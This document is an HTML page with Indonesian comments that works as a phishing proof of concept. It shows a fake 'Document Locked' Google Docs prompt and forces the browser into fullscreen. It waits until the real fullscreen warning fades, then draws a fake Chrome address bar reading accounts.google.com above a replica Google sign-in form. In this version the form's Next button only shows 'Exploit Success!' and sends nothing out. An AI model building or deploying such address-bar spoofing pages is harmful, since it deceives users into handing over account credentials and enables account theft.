<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { margin: 0; font-family: 'Roboto', sans-serif; background: #fff; overflow: hidden; }
        
        /* Address Bar Palsu (accounts.google.com) */
        #fake-chrome-ui {
            display: none; width: 100%; height: 56px; background: #fff;
            border-bottom: 1px solid #dfe1e5; align-items: center; padding: 0 16px; box-sizing: border-box;
            position: fixed; top: 0; z-index: 9999;
        }
        .url-box { background: #f1f3f4; flex-grow: 1; margin: 0 12px; padding: 10px 16px; border-radius: 24px; font-size: 14px; color: #202124; display: flex; align-items: center; }

        /* Layar Utama */
        #content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; text-align: center; }
        .btn { background: #1a73e8; color: #fff; padding: 15px 30px; border: none; border-radius: 25px; font-size: 16px; font-weight: 500; width: 100%; max-width: 300px; }
    </style>
</head>
<body>

<div id="content">
    <img src="https://www.gstatic.com/images/branding/product/2x/docs_96dp.png" width="80">
    <h2 id="title">Document Locked</h2>
    <p id="desc">You must be signed in to access this internal document.</p>
    <button id="btn" class="btn">Sign in with Google</button>
</div>

<div id="fake-chrome-ui">
    <span style="color: #5f6368;">&#128274;</span>
    <div class="url-box">accounts.google.com</div>
    <span style="color: #5f6368;">&#8942;</span>
</div>

<script>
    const btn = document.getElementById('btn');
    const ui = document.getElementById('fake-chrome-ui');
    const content = document.getElementById('content');

    btn.onclick = function() {
        // STAGE 1: MASUK FULLSCREEN
        document.documentElement.requestFullscreen();
        
        btn.innerText = "Connecting to Google...";
        btn.disabled = true;

        // STAGE 2: TUNGGU 4 DETIK (Biar notif Fullscreen asli ilang)
        setTimeout(() => {
            ui.style.display = 'flex';
            content.innerHTML = `
                <div style="margin-top: 80px; width: 100%; text-align: left; padding: 0 10px; box-sizing: border-box;">
                    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
                    <h1 style="font-size: 22px; font-weight: 400; margin-top: 20px;">Sign in</h1>
                    <p style="font-size: 14px; color: #202124;">to continue to Google Docs</p>
                    <input type="email" id="target" placeholder="Email or phone" style="width:100%; padding:15px; margin-top:30px; border:1px solid #dadce0; border-radius:4px; font-size:16px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 50px;">
                        <span style="color: #1a73e8; font-weight: 500; font-size: 14px;">Forgot email?</span>
                        <button onclick="alert('Exploit Success!')" style="background:#1a73e8; color:#fff; border:none; padding:12px 28px; border-radius:4px; font-weight:500;">Next</button>
                    </div>
                </div>
            `;
        }, 4000);
    };
</script>

</body>
</html>
